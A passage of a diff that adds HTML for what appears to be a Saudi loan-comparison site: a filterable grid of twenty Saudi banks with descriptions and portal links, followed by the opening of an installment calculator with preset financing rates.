+                        <input type="text" id="bankSearch" onkeyup="filterBanks()" placeholder="Search bank name (e.g., Al Rajhi, SNB, Riyad Bank, STC Bank)..." class="w-full pl-11 pr-4 py-3 bg-saudi-sand rounded-xl border border-gray-300 text-xs sm:text-sm font-semibold text-saudi-navy focus:border-saudi-green outline-none">
+                    </div>
+
+                    <div class="md:col-span-6 flex flex-wrap gap-2 justify-start md:justify-end">
+                        <button type="button" onclick="setBankCategory('all')" id="catBtn-all" class="bank-cat-btn px-4 py-2 rounded-xl text-xs font-black transition bg-saudi-navy text-white shadow-xs">
+                            All (20)
+                        </button>
+                        <button type="button" onclick="setBankCategory('islamic')" id="catBtn-islamic" class="bank-cat-btn px-4 py-2 rounded-xl text-xs font-black transition bg-gray-100 text-gray-700 hover:bg-saudi-gold hover:text-saudi-navy">
+                            Islamic / Shariah (6)
+                        </button>
+                        <button type="button" onclick="setBankCategory('conventional')" id="catBtn-conventional" class="bank-cat-btn px-4 py-2 rounded-xl text-xs font-black transition bg-gray-100 text-gray-700 hover:bg-saudi-gold hover:text-saudi-navy">
+                            Local & Foreign (11)
+                        </button>
+                        <button type="button" onclick="setBankCategory('digital')" id="catBtn-digital" class="bank-cat-btn px-4 py-2 rounded-xl text-xs font-black transition bg-gray-100 text-gray-700 hover:bg-saudi-gold hover:text-saudi-navy">
+                            Digital Banks (3)
+                        </button>
+                    </div>
+
+                </div>
+            </div>
+
+            <!-- Banks Grid Container (20 Banks) -->
+            <div id="banksGrid" class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-5">
+
+                <div class="bank-card bg-white p-5 rounded-2xl border border-gray-200 shadow-xs hover:border-saudi-gold hover:shadow-md transition flex flex-col justify-between" data-category="islamic" data-name="al rajhi bank rajhi">
+                    <div>
+                        <div class="flex justify-between items-start mb-3">
+                            <div class="w-10 h-10 rounded-xl bg-saudi-navy text-saudi-gold flex items-center justify-center font-black text-base shadow-xs">RJH</div>
+                            <span class="bg-emerald-50 text-emerald-800 border border-emerald-200 text-[10px] font-extrabold px-2 py-0.5 rounded">Islamic</span>
+                        </div>
+                        <h4 class="font-extrabold text-base text-saudi-navy">Al Rajhi Bank</h4>
+                        <p class="text-xs text-gray-500 mt-0.5">Riyadh • مصرف الراجحي</p>
+                        <p class="text-[11px] text-gray-600 mt-2 line-clamp-2">Personal and SME finance options from 5,000 SAR to 500,000 SAR with digital onboarding via Nafath.</p>
+                    </div>
+                    <div class="mt-4 pt-3 border-t border-gray-100 flex justify-between items-center text-xs">
+                        <span class="font-bold text-emerald-700 text-[11px]"><i class="fa-solid fa-check-circle"></i> Nafath Enabled</span>
+                        <a href="https://www.alrajhibank.com.sa" target="_blank" rel="noopener" class="text-saudi-green font-black hover:underline text-[11px]">Visit Portal <i class="fa-solid fa-arrow-up-right-from-square text-[10px]"></i></a>
+                    </div>
+                </div>
+
+                <div class="bank-card bg-white p-5 rounded-2xl border border-gray-200 shadow-xs hover:border-saudi-gold hover:shadow-md transition flex flex-col justify-between" data-category="conventional" data-name="saudi national bank snb alahli">
+                    <div>
+                        <div class="flex justify-between items-start mb-3">
+                            <div class="w-10 h-10 rounded-xl bg-saudi-green text-white flex items-center justify-center font-black text-base shadow-xs">SNB</div>
+                            <span class="bg-blue-50 text-blue-700 border border-blue-200 text-[10px] font-extrabold px-2 py-0.5 rounded">Local Bank</span>
+                        </div>
+                        <h4 class="font-extrabold text-base text-saudi-navy">Saudi National Bank (SNB)</h4>
+                        <p class="text-xs text-gray-500 mt-0.5">Riyadh • البنك الأهلي السعودي</p>
+                        <p class="text-[11px] text-gray-600 mt-2 line-clamp-2">Personal and commercial financing programs for citizens and eligible residents across the Kingdom.</p>
+                    </div>
+                    <div class="mt-4 pt-3 border-t border-gray-100 flex justify-between items-center text-xs">
+                        <span class="font-bold text-emerald-700 text-[11px]"><i class="fa-solid fa-check-circle"></i> Salaried & SME</span>
+                        <a href="https://www.alahli.com" target="_blank" rel="noopener" class="text-saudi-green font-black hover:underline text-[11px]">Visit Portal <i class="fa-solid fa-arrow-up-right-from-square text-[10px]"></i></a>
+                    </div>
+                </div>
+
+                <div class="bank-card bg-white p-5 rounded-2xl border border-gray-200 shadow-xs hover:border-saudi-gold hover:shadow-md transition flex flex-col justify-between" data-category="conventional" data-name="riyad bank riyad">
+                    <div>
+                        <div class="flex justify-between items-start mb-3">
+                            <div class="w-10 h-10 rounded-xl bg-sky-900 text-white flex items-center justify-center font-black text-base shadow-xs">RYD</div>
+                            <span class="bg-blue-50 text-blue-700 border border-blue-200 text-[10px] font-extrabold px-2 py-0.5 rounded">Local Bank</span>
+                        </div>
+                        <h4 class="font-extrabold text-base text-saudi-navy">Riyad Bank</h4>
+                        <p class="text-xs text-gray-500 mt-0.5">Riyadh • بنك الرياض</p>
+                        <p class="text-[11px] text-gray-600 mt-2 line-clamp-2">Personal finance, corporate banking, and SME support options with flexible tenors.</p>
+                    </div>
+                    <div class="mt-4 pt-3 border-t border-gray-100 flex justify-between items-center text-xs">
+                        <span class="font-bold text-emerald-700 text-[11px]"><i class="fa-solid fa-check-circle"></i> Personal & SME</span>
+                        <a href="https://www.riyadbank.com" target="_blank" rel="noopener" class="text-saudi-green font-black hover:underline text-[11px]">Visit Portal <i class="fa-solid fa-arrow-up-right-from-square text-[10px]"></i></a>
+                    </div>
+                </div>
+
+                <div class="bank-card bg-white p-5 rounded-2xl border border-gray-200 shadow-xs hover:border-saudi-gold hover:shadow-md transition flex flex-col justify-between" data-category="islamic" data-name="alinma bank inma">
+                    <div>
+                        <div class="flex justify-between items-start mb-3">
+                            <div class="w-10 h-10 rounded-xl bg-emerald-800 text-saudi-gold flex items-center justify-center font-black text-base shadow-xs">INM</div>
+                            <span class="bg-emerald-50 text-emerald-800 border border-emerald-200 text-[10px] font-extrabold px-2 py-0.5 rounded">Islamic</span>
+                        </div>
+                        <h4 class="font-extrabold text-base text-saudi-navy">Alinma Bank</h4>
+                        <p class="text-xs text-gray-500 mt-0.5">Riyadh • مصرف الإنماء</p>
+                        <p class="text-[11px] text-gray-600 mt-2 line-clamp-2">Shariah-compliant personal and business financing with digital application workflows.</p>
+                    </div>
+                    <div class="mt-4 pt-3 border-t border-gray-100 flex justify-between items-center text-xs">
+                        <span class="font-bold text-emerald-700 text-[11px]"><i class="fa-solid fa-check-circle"></i> Shariah Board</span>
+                        <a href="https://www.alinma.com" target="_blank" rel="noopener" class="text-saudi-green font-black hover:underline text-[11px]">Visit Portal <i class="fa-solid fa-arrow-up-right-from-square text-[10px]"></i></a>
+                    </div>
+                </div>
+
+                <div class="bank-card bg-white p-5 rounded-2xl border border-gray-200 shadow-xs hover:border-saudi-gold hover:shadow-md transition flex flex-col justify-between" data-category="islamic" data-name="bank albilad albilad">
+                    <div>
+                        <div class="flex justify-between items-start mb-3">
+                            <div class="w-10 h-10 rounded-xl bg-emerald-900 text-white flex items-center justify-center font-black text-base shadow-xs">BLD</div>
+                            <span class="bg-emerald-50 text-emerald-800 border border-emerald-200 text-[10px] font-extrabold px-2 py-0.5 rounded">Islamic</span>
+                        </div>
+                        <h4 class="font-extrabold text-base text-saudi-navy">Bank Albilad</h4>
+                        <p class="text-xs text-gray-500 mt-0.5">Riyadh • بنك البلاد</p>
+                        <p class="text-[11px] text-gray-600 mt-2 line-clamp-2">Islamic personal and commercial financing solutions tailored for individuals and businesses.</p>
+                    </div>
+                    <div class="mt-4 pt-3 border-t border-gray-100 flex justify-between items-center text-xs">
+                        <span class="font-bold text-emerald-700 text-[11px]"><i class="fa-solid fa-check-circle"></i> Islamic Finance</span>
+                        <a href="https://www.bankalbilad.com" target="_blank" rel="noopener" class="text-saudi-green font-black hover:underline text-[11px]">Visit Portal <i class="fa-solid fa-arrow-up-right-from-square text-[10px]"></i></a>
+                    </div>
+                </div>
+
+                <div class="bank-card bg-white p-5 rounded-2xl border border-gray-200 shadow-xs hover:border-saudi-gold hover:shadow-md transition flex flex-col justify-between" data-category="islamic" data-name="bank aljazira aljazira baj">
+                    <div>
+                        <div class="flex justify-between items-start mb-3">
+                            <div class="w-10 h-10 rounded-xl bg-teal-800 text-white flex items-center justify-center font-black text-base shadow-xs">BAJ</div>
+                            <span class="bg-emerald-50 text-emerald-800 border border-emerald-200 text-[10px] font-extrabold px-2 py-0.5 rounded">Islamic</span>
+                        </div>
+                        <h4 class="font-extrabold text-base text-saudi-navy">Bank Aljazira</h4>
+                        <p class="text-xs text-gray-500 mt-0.5">Jeddah • بنك الجزيرة</p>
+                        <p class="text-[11px] text-gray-600 mt-2 line-clamp-2">Shariah-compliant financing and SME support products across Saudi Arabia.</p>
+                    </div>
+                    <div class="mt-4 pt-3 border-t border-gray-100 flex justify-between items-center text-xs">
+                        <span class="font-bold text-emerald-700 text-[11px]"><i class="fa-solid fa-check-circle"></i> Shariah Certified</span>
+                        <a href="https://www.baj.com.sa" target="_blank" rel="noopener" class="text-saudi-green font-black hover:underline text-[11px]">Visit Portal <i class="fa-solid fa-arrow-up-right-from-square text-[10px]"></i></a>
+                    </div>
+                </div>
+
+                <div class="bank-card bg-white p-5 rounded-2xl border border-gray-200 shadow-xs hover:border-saudi-gold hover:shadow-md transition flex flex-col justify-between" data-category="conventional" data-name="saudi awwal bank sab sabb">
+                    <div>
+                        <div class="flex justify-between items-start mb-3">
+                            <div class="w-10 h-10 rounded-xl bg-red-700 text-white flex items-center justify-center font-black text-base shadow-xs">SAB</div>
+                            <span class="bg-blue-50 text-blue-700 border border-blue-200 text-[10px] font-extrabold px-2 py-0.5 rounded">Local Bank</span>
+                        </div>
+                        <h4 class="font-extrabold text-base text-saudi-navy">Saudi Awwal Bank (SAB)</h4>
+                        <p class="text-xs text-gray-500 mt-0.5">Riyadh • البنك السعودي الأول</p>
+                        <p class="text-[11px] text-gray-600 mt-2 line-clamp-2">Personal loans, SME financing, and Kafalah guarantee participation.</p>
+                    </div>
+                    <div class="mt-4 pt-3 border-t border-gray-100 flex justify-between items-center text-xs">
+                        <span class="font-bold text-emerald-700 text-[11px]"><i class="fa-solid fa-check-circle"></i> Kafalah Partner</span>
+                        <a href="https://www.sab.com" target="_blank" rel="noopener" class="text-saudi-green font-black hover:underline text-[11px]">Visit Portal <i class="fa-solid fa-arrow-up-right-from-square text-[10px]"></i></a>
+                    </div>
+                </div>
+
+                <div class="bank-card bg-white p-5 rounded-2xl border border-gray-200 shadow-xs hover:border-saudi-gold hover:shadow-md transition flex flex-col justify-between" data-category="conventional" data-name="banque saudi fransi bsf">
+                    <div>
+                        <div class="flex justify-between items-start mb-3">
+                            <div class="w-10 h-10 rounded-xl bg-indigo-900 text-saudi-gold flex items-center justify-center font-black text-base shadow-xs">BSF</div>
+                            <span class="bg-blue-50 text-blue-700 border border-blue-200 text-[10px] font-extrabold px-2 py-0.5 rounded">Local Bank</span>
+                        </div>
+                        <h4 class="font-extrabold text-base text-saudi-navy">Banque Saudi Fransi (BSF)</h4>
+                        <p class="text-xs text-gray-500 mt-0.5">Riyadh • البنك السعودي الفرنسي</p>
+                        <p class="text-[11px] text-gray-600 mt-2 line-clamp-2">Personal and corporate financing tailored for salaried professionals and businesses.</p>
+                    </div>
+                    <div class="mt-4 pt-3 border-t border-gray-100 flex justify-between items-center text-xs">
+                        <span class="font-bold text-emerald-700 text-[11px]"><i class="fa-solid fa-check-circle"></i> Personal & SME</span>
+                        <a href="https://www.alfransi.com.sa" target="_blank" rel="noopener" class="text-saudi-green font-black hover:underline text-[11px]">Visit Portal <i class="fa-solid fa-arrow-up-right-from-square text-[10px]"></i></a>
+                    </div>
+                </div>
+
+                <div class="bank-card bg-white p-5 rounded-2xl border border-gray-200 shadow-xs hover:border-saudi-gold hover:shadow-md transition flex flex-col justify-between" data-category="conventional" data-name="arab national bank anb">
+                    <div>
+                        <div class="flex justify-between items-start mb-3">
+                            <div class="w-10 h-10 rounded-xl bg-blue-900 text-white flex items-center justify-center font-black text-base shadow-xs">ANB</div>
+                            <span class="bg-blue-50 text-blue-700 border border-blue-200 text-[10px] font-extrabold px-2 py-0.5 rounded">Local Bank</span>
+                        </div>
+                        <h4 class="font-extrabold text-base text-saudi-navy">Arab National Bank (ANB)</h4>
+                        <p class="text-xs text-gray-500 mt-0.5">Riyadh • البنك العربي الوطني</p>
+                        <p class="text-[11px] text-gray-600 mt-2 line-clamp-2">Personal financing and business solutions for citizens and eligible residents.</p>
+                    </div>
+                    <div class="mt-4 pt-3 border-t border-gray-100 flex justify-between items-center text-xs">
+                        <span class="font-bold text-emerald-700 text-[11px]"><i class="fa-solid fa-check-circle"></i> SAMA Licensed</span>
+                        <a href="https://www.anb.com.sa" target="_blank" rel="noopener" class="text-saudi-green font-black hover:underline text-[11px]">Visit Portal <i class="fa-solid fa-arrow-up-right-from-square text-[10px]"></i></a>
+                    </div>
+                </div>
+
+                <div class="bank-card bg-white p-5 rounded-2xl border border-gray-200 shadow-xs hover:border-saudi-gold hover:shadow-md transition flex flex-col justify-between" data-category="conventional" data-name="saudi investment bank saib">
+                    <div>
+                        <div class="flex justify-between items-start mb-3">
+                            <div class="w-10 h-10 rounded-xl bg-slate-800 text-saudi-gold flex items-center justify-center font-black text-base shadow-xs">SAIB</div>
+                            <span class="bg-blue-50 text-blue-700 border border-blue-200 text-[10px] font-extrabold px-2 py-0.5 rounded">Local Bank</span>
+                        </div>
+                        <h4 class="font-extrabold text-base text-saudi-navy">The Saudi Investment Bank</h4>
+                        <p class="text-xs text-gray-500 mt-0.5">Riyadh • البنك السعودي للاستثمار</p>
+                        <p class="text-[11px] text-gray-600 mt-2 line-clamp-2">Personal and commercial banking products with competitive terms.</p>
+                    </div>
+                    <div class="mt-4 pt-3 border-t border-gray-100 flex justify-between items-center text-xs">
+                        <span class="font-bold text-emerald-700 text-[11px]"><i class="fa-solid fa-check-circle"></i> Personal & SME</span>
+                        <a href="https://www.saib.com.sa" target="_blank" rel="noopener" class="text-saudi-green font-black hover:underline text-[11px]">Visit Portal <i class="fa-solid fa-arrow-up-right-from-square text-[10px]"></i></a>
+                    </div>
+                </div>
+
+                <div class="bank-card bg-white p-5 rounded-2xl border border-gray-200 shadow-xs hover:border-saudi-gold hover:shadow-md transition flex flex-col justify-between" data-category="conventional" data-name="gulf international bank gib saudi arabia">
+                    <div>
+                        <div class="flex justify-between items-start mb-3">
+                            <div class="w-10 h-10 rounded-xl bg-blue-950 text-cyan-300 flex items-center justify-center font-black text-base shadow-xs">GIB</div>
+                            <span class="bg-blue-50 text-blue-700 border border-blue-200 text-[10px] font-extrabold px-2 py-0.5 rounded">Local Bank</span>
+                        </div>
+                        <h4 class="font-extrabold text-base text-saudi-navy">GIB Saudi Arabia</h4>
+                        <p class="text-xs text-gray-500 mt-0.5">Khobar • بنك الخليج الدولي</p>
+                        <p class="text-[11px] text-gray-600 mt-2 line-clamp-2">Retail banking and commercial financing options under SAMA supervision.</p>
+                    </div>
+                    <div class="mt-4 pt-3 border-t border-gray-100 flex justify-between items-center text-xs">
+                        <span class="font-bold text-emerald-700 text-[11px]"><i class="fa-solid fa-check-circle"></i> SAMA Licensed</span>
+                        <a href="https://www.gib.com" target="_blank" rel="noopener" class="text-saudi-green font-black hover:underline text-[11px]">Visit Portal <i class="fa-solid fa-arrow-up-right-from-square text-[10px]"></i></a>
+                    </div>
+                </div>
+
+                <div class="bank-card bg-white p-5 rounded-2xl border border-gray-200 shadow-xs hover:border-saudi-gold hover:shadow-md transition flex flex-col justify-between" data-category="digital" data-name="stc bank digital">
+                    <div>
+                        <div class="flex justify-between items-start mb-3">
+                            <div class="w-10 h-10 rounded-xl bg-purple-900 text-white flex items-center justify-center font-black text-base shadow-xs">STC</div>
+                            <span class="bg-purple-50 text-purple-700 border border-purple-200 text-[10px] font-extrabold px-2 py-0.5 rounded">Digital Bank</span>
+                        </div>
+                        <h4 class="font-extrabold text-base text-saudi-navy">STC Bank</h4>
+                        <p class="text-xs text-gray-500 mt-0.5">Riyadh • بنك إس تي سي</p>
+                        <p class="text-[11px] text-gray-600 mt-2 line-clamp-2">SAMA-licensed digital bank offering mobile-first financial services.</p>
+                    </div>
+                    <div class="mt-4 pt-3 border-t border-gray-100 flex justify-between items-center text-xs">
+                        <span class="font-bold text-emerald-700 text-[11px]"><i class="fa-solid fa-check-circle"></i> Digital App</span>
+                        <a href="https://www.stcbank.com.sa" target="_blank" rel="noopener" class="text-saudi-green font-black hover:underline text-[11px]">Visit Portal <i class="fa-solid fa-arrow-up-right-from-square text-[10px]"></i></a>
+                    </div>
+                </div>
+
+                <div class="bank-card bg-white p-5 rounded-2xl border border-gray-200 shadow-xs hover:border-saudi-gold hover:shadow-md transition flex flex-col justify-between" data-category="digital" data-name="d360 bank digital">
+                    <div>
+                        <div class="flex justify-between items-start mb-3">
+                            <div class="w-10 h-10 rounded-xl bg-gradient-to-br from-emerald-600 to-teal-800 text-white flex items-center justify-center font-black text-base shadow-xs">D360</div>
+                            <span class="bg-purple-50 text-purple-700 border border-purple-200 text-[10px] font-extrabold px-2 py-0.5 rounded">Digital Bank</span>
+                        </div>
+                        <h4 class="font-extrabold text-base text-saudi-navy">D360 Bank</h4>
+                        <p class="text-xs text-gray-500 mt-0.5">Riyadh • بنك دال ثلاثمائة وستون</p>
+                        <p class="text-[11px] text-gray-600 mt-2 line-clamp-2">Digital banking platform licensed by SAMA for modern personal & business needs.</p>
+                    </div>
+                    <div class="mt-4 pt-3 border-t border-gray-100 flex justify-between items-center text-xs">
+                        <span class="font-bold text-emerald-700 text-[11px]"><i class="fa-solid fa-check-circle"></i> SAMA Licensed</span>
+                        <a href="https://www.d360.com" target="_blank" rel="noopener" class="text-saudi-green font-black hover:underline text-[11px]">Visit Portal <i class="fa-solid fa-arrow-up-right-from-square text-[10px]"></i></a>
+                    </div>
+                </div>
+
+                <div class="bank-card bg-white p-5 rounded-2xl border border-gray-200 shadow-xs hover:border-saudi-gold hover:shadow-md transition flex flex-col justify-between" data-category="digital" data-name="vision bank digital">
+                    <div>
+                        <div class="flex justify-between items-start mb-3">
+                            <div class="w-10 h-10 rounded-xl bg-saudi-navy text-saudi-gold flex items-center justify-center font-black text-base shadow-xs">VSN</div>
+                            <span class="bg-purple-50 text-purple-700 border border-purple-200 text-[10px] font-extrabold px-2 py-0.5 rounded">Digital Bank</span>
+                        </div>
+                        <h4 class="font-extrabold text-base text-saudi-navy">Vision Bank</h4>
+                        <p class="text-xs text-gray-500 mt-0.5">Riyadh • بنك فيجن</p>
+                        <p class="text-[11px] text-gray-600 mt-2 line-clamp-2">Cloud-native Islamic digital banking institution operating under SAMA.</p>
+                    </div>
+                    <div class="mt-4 pt-3 border-t border-gray-100 flex justify-between items-center text-xs">
+                        <span class="font-bold text-emerald-700 text-[11px]"><i class="fa-solid fa-check-circle"></i> Digital Islamic</span>
+                        <a href="https://www.sama.gov.sa" target="_blank" rel="noopener" class="text-saudi-green font-black hover:underline text-[11px]">Visit Portal <i class="fa-solid fa-arrow-up-right-from-square text-[10px]"></i></a>
+                    </div>
+                </div>
+
+                <div class="bank-card bg-white p-5 rounded-2xl border border-gray-200 shadow-xs hover:border-saudi-gold hover:shadow-md transition flex flex-col justify-between" data-category="conventional" data-name="emirates nbd saudi arabia ksa">
+                    <div>
+                        <div class="flex justify-between items-start mb-3">
+                            <div class="w-10 h-10 rounded-xl bg-blue-950 text-saudi-gold flex items-center justify-center font-black text-base shadow-xs">ENBD</div>
+                            <span class="bg-blue-50 text-blue-700 border border-blue-200 text-[10px] font-extrabold px-2 py-0.5 rounded">Foreign Branch</span>
+                        </div>
+                        <h4 class="font-extrabold text-base text-saudi-navy">Emirates NBD (KSA)</h4>
+                        <p class="text-xs text-gray-500 mt-0.5">SAMA-Licensed Foreign Branch</p>
+                        <p class="text-[11px] text-gray-600 mt-2 line-clamp-2">Corporate, commercial, and banking services across Saudi Arabia.</p>
+                    </div>
+                    <div class="mt-4 pt-3 border-t border-gray-100 flex justify-between items-center text-xs">
+                        <span class="font-bold text-emerald-700 text-[11px]"><i class="fa-solid fa-check-circle"></i> SAMA Licensed</span>
+                        <a href="https://www.sama.gov.sa" target="_blank" rel="noopener" class="text-saudi-green font-black hover:underline text-[11px]">Visit Portal <i class="fa-solid fa-arrow-up-right-from-square text-[10px]"></i></a>
+                    </div>
+                </div>
+
+                <div class="bank-card bg-white p-5 rounded-2xl border border-gray-200 shadow-xs hover:border-saudi-gold hover:shadow-md transition flex flex-col justify-between" data-category="conventional" data-name="first abu dhabi bank fab saudi arabia ksa">
+                    <div>
+                        <div class="flex justify-between items-start mb-3">
+                            <div class="w-10 h-10 rounded-xl bg-red-600 text-white flex items-center justify-center font-black text-base shadow-xs">FAB</div>
+                            <span class="bg-blue-50 text-blue-700 border border-blue-200 text-[10px] font-extrabold px-2 py-0.5 rounded">Foreign Branch</span>
+                        </div>
+                        <h4 class="font-extrabold text-base text-saudi-navy">First Abu Dhabi Bank (KSA)</h4>
+                        <p class="text-xs text-gray-500 mt-0.5">SAMA-Licensed Foreign Branch</p>
+                        <p class="text-[11px] text-gray-600 mt-2 line-clamp-2">Regional banking and financing services operating in Saudi Arabia.</p>
+                    </div>
+                    <div class="mt-4 pt-3 border-t border-gray-100 flex justify-between items-center text-xs">
+                        <span class="font-bold text-emerald-700 text-[11px]"><i class="fa-solid fa-check-circle"></i> SAMA Licensed</span>
+                        <a href="https://www.sama.gov.sa" target="_blank" rel="noopener" class="text-saudi-green font-black hover:underline text-[11px]">Visit Portal <i class="fa-solid fa-arrow-up-right-from-square text-[10px]"></i></a>
+                    </div>
+                </div>
+
+                <div class="bank-card bg-white p-5 rounded-2xl border border-gray-200 shadow-xs hover:border-saudi-gold hover:shadow-md transition flex flex-col justify-between" data-category="conventional" data-name="qnb qatar national bank saudi arabia ksa">
+                    <div>
+                        <div class="flex justify-between items-start mb-3">
+                            <div class="w-10 h-10 rounded-xl bg-rose-900 text-white flex items-center justify-center font-black text-base shadow-xs">QNB</div>
+                            <span class="bg-blue-50 text-blue-700 border border-blue-200 text-[10px] font-extrabold px-2 py-0.5 rounded">Foreign Branch</span>
+                        </div>
+                        <h4 class="font-extrabold text-base text-saudi-navy">QNB Saudi Arabia</h4>
+                        <p class="text-xs text-gray-500 mt-0.5">SAMA-Licensed Foreign Branch</p>
+                        <p class="text-[11px] text-gray-600 mt-2 line-clamp-2">Commercial and business banking solutions licensed in the Kingdom.</p>
+                    </div>
+                    <div class="mt-4 pt-3 border-t border-gray-100 flex justify-between items-center text-xs">
+                        <span class="font-bold text-emerald-700 text-[11px]"><i class="fa-solid fa-check-circle"></i> SAMA Licensed</span>
+                        <a href="https://www.sama.gov.sa" target="_blank" rel="noopener" class="text-saudi-green font-black hover:underline text-[11px]">Visit Portal <i class="fa-solid fa-arrow-up-right-from-square text-[10px]"></i></a>
+                    </div>
+                </div>
+
+                <div class="bank-card bg-white p-5 rounded-2xl border border-gray-200 shadow-xs hover:border-saudi-gold hover:shadow-md transition flex flex-col justify-between" data-category="conventional" data-name="nbk national bank of kuwait saudi arabia ksa">
+                    <div>
+                        <div class="flex justify-between items-start mb-3">
+                            <div class="w-10 h-10 rounded-xl bg-blue-800 text-white flex items-center justify-center font-black text-base shadow-xs">NBK</div>
+                            <span class="bg-blue-50 text-blue-700 border border-blue-200 text-[10px] font-extrabold px-2 py-0.5 rounded">Foreign Branch</span>
+                        </div>
+                        <h4 class="font-extrabold text-base text-saudi-navy">National Bank of Kuwait (KSA)</h4>
+                        <p class="text-xs text-gray-500 mt-0.5">SAMA-Licensed Foreign Branch</p>
+                        <p class="text-[11px] text-gray-600 mt-2 line-clamp-2">GCC banking and financing services licensed by SAMA.</p>
+                    </div>
+                    <div class="mt-4 pt-3 border-t border-gray-100 flex justify-between items-center text-xs">
+                        <span class="font-bold text-emerald-700 text-[11px]"><i class="fa-solid fa-check-circle"></i> SAMA Licensed</span>
+                        <a href="https://www.sama.gov.sa" target="_blank" rel="noopener" class="text-saudi-green font-black hover:underline text-[11px]">Visit Portal <i class="fa-solid fa-arrow-up-right-from-square text-[10px]"></i></a>
+                    </div>
+                </div>
+
+                <div class="bank-card bg-white p-5 rounded-2xl border border-gray-200 shadow-xs hover:border-saudi-gold hover:shadow-md transition flex flex-col justify-between" data-category="conventional" data-name="banque misr saudi arabia ksa">
+                    <div>
+                        <div class="flex justify-between items-start mb-3">
+                            <div class="w-10 h-10 rounded-xl bg-amber-700 text-white flex items-center justify-center font-black text-base shadow-xs">MSR</div>
+                            <span class="bg-blue-50 text-blue-700 border border-blue-200 text-[10px] font-extrabold px-2 py-0.5 rounded">Foreign Branch</span>
+                        </div>
+                        <h4 class="font-extrabold text-base text-saudi-navy">Banque Misr (KSA)</h4>
+                        <p class="text-xs text-gray-500 mt-0.5">SAMA-Licensed Foreign Branch</p>
+                        <p class="text-[11px] text-gray-600 mt-2 line-clamp-2">Regional banking operations licensed under Saudi Central Bank supervision.</p>
+                    </div>
+                    <div class="mt-4 pt-3 border-t border-gray-100 flex justify-between items-center text-xs">
+                        <span class="font-bold text-emerald-700 text-[11px]"><i class="fa-solid fa-check-circle"></i> SAMA Licensed</span>
+                        <a href="https://www.sama.gov.sa" target="_blank" rel="noopener" class="text-saudi-green font-black hover:underline text-[11px]">Visit Portal <i class="fa-solid fa-arrow-up-right-from-square text-[10px]"></i></a>
+                    </div>
+                </div>
+
+                <div class="bank-card bg-white p-5 rounded-2xl border border-gray-200 shadow-xs hover:border-saudi-gold hover:shadow-md transition flex flex-col justify-between" data-category="conventional" data-name="standard chartered saudi arabia ksa">
+                    <div>
+                        <div class="flex justify-between items-start mb-3">
+                            <div class="w-10 h-10 rounded-xl bg-blue-900 text-green-400 flex items-center justify-center font-black text-base shadow-xs">SC</div>
+                            <span class="bg-blue-50 text-blue-700 border border-blue-200 text-[10px] font-extrabold px-2 py-0.5 rounded">Foreign Branch</span>
+                        </div>
+                        <h4 class="font-extrabold text-base text-saudi-navy">Standard Chartered (KSA)</h4>
+                        <p class="text-xs text-gray-500 mt-0.5">SAMA-Licensed Foreign Branch</p>
+                        <p class="text-[11px] text-gray-600 mt-2 line-clamp-2">International and corporate banking branch in Saudi Arabia.</p>
+                    </div>
+                    <div class="mt-4 pt-3 border-t border-gray-100 flex justify-between items-center text-xs">
+                        <span class="font-bold text-emerald-700 text-[11px]"><i class="fa-solid fa-check-circle"></i> SAMA Licensed</span>
+                        <a href="https://www.sama.gov.sa" target="_blank" rel="noopener" class="text-saudi-green font-black hover:underline text-[11px]">Visit Portal <i class="fa-solid fa-arrow-up-right-from-square text-[10px]"></i></a>
+                    </div>
+                </div>
+
+            </div>
+
+            <!-- Empty Search Results Message -->
+            <div id="noBanksMsg" class="hidden text-center py-12 bg-white rounded-2xl border border-gray-200">
+                <i class="fa-solid fa-building-circle-xmark text-4xl text-gray-300 mb-2"></i>
+                <h4 class="text-base font-extrabold text-saudi-navy">No banks matched your search query</h4>
+                <p class="text-xs text-gray-500 mt-1">Try clearing filters or searching for terms like "Al Rajhi", "SNB", "Riyad", or "STC Bank".</p>
+                <button type="button" onclick="setBankCategory('all')" class="mt-4 px-4 py-2 bg-saudi-navy text-white text-xs font-bold rounded-xl">Reset Search Filters</button>
+            </div>
+
+        </div>
+    </section>
+
+    <!-- INTERACTIVE EMI & LOAN CALCULATOR SECTION + SLOT 4 -->
+    <section id="calculator" class="bg-white py-16 border-y border-saudi-sandDark">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="text-center max-w-3xl mx-auto mb-10">
+                <span class="text-saudi-goldDark font-extrabold text-xs uppercase tracking-widest bg-saudi-gold/15 px-3 py-1 rounded-full">Interactive Estimation Tool</span>
+                <h2 class="text-3xl font-black text-saudi-navy mt-3">Saudi Loan & Installment Calculator (SAR)</h2>
+                <p class="text-gray-600 text-sm mt-1">Estimate your monthly installment (EMI), total profit/interest cost, and total repayment from 5,000 SAR to 500,000 SAR.</p>
+            </div>
+
+            <!-- SLOT 4 BANNER IMAGE -->
+            <div class="mb-8 bg-saudi-sand rounded-3xl p-3 sm:p-4 border border-saudi-borderGold/50 shadow-sm">
+                <div class="responsive-media-frame rounded-2xl">
+                    <img id="img-slot-4" data-slot-id="slot-4" src="" alt="EMI Calculator Banner" class="slot-media-img">
+                </div>
+            </div>
+
+            <div class="bg-saudi-sand rounded-3xl p-6 sm:p-10 border-2 border-saudi-borderGold/40 shadow-xl grid lg:grid-cols-12 gap-8 items-center">
+
+                <!-- Left Sliders Control -->
+                <div class="lg:col-span-7 space-y-6">
+
+                    <div>
+                        <label class="block text-xs font-extrabold text-saudi-navy uppercase tracking-wider mb-2">Select Financing Rate Structure</label>
+                        <div class="grid grid-cols-1 sm:grid-cols-3 gap-3">
+                            <label class="cursor-pointer border-2 border-saudi-gold bg-white p-3 rounded-xl flex items-center gap-2 text-xs font-bold text-saudi-navy shadow-xs">
+                                <input type="radio" name="rateType" value="0" checked onchange="calculateEMI()" class="text-saudi-green accent-saudi-green">
+                                <span>0% Promotional / Grant</span>
+                            </label>
+                            <label class="cursor-pointer border-2 border-gray-200 bg-white p-3 rounded-xl flex items-center gap-2 text-xs font-bold text-saudi-navy shadow-xs">
+                                <input type="radio" name="rateType" value="5.5" onchange="calculateEMI()" class="text-saudi-green accent-saudi-green">
+                                <span>5.50% Salaried APR</span>
+                            </label>
+                            <label class="cursor-pointer border-2 border-gray-200 bg-white p-3 rounded-xl flex items-center gap-2 text-xs font-bold text-saudi-navy shadow-xs">
+                                <input type="radio" name="rateType" value="8.0" onchange="calculateEMI()" class="text-saudi-green accent-saudi-green">
+                                <span>8.00% Standard / SME APR</span>
+                            </label>
+                        </div>
+                    </div>
+
+                    <div>
+                        <div class="flex justify-between items-center mb-2">
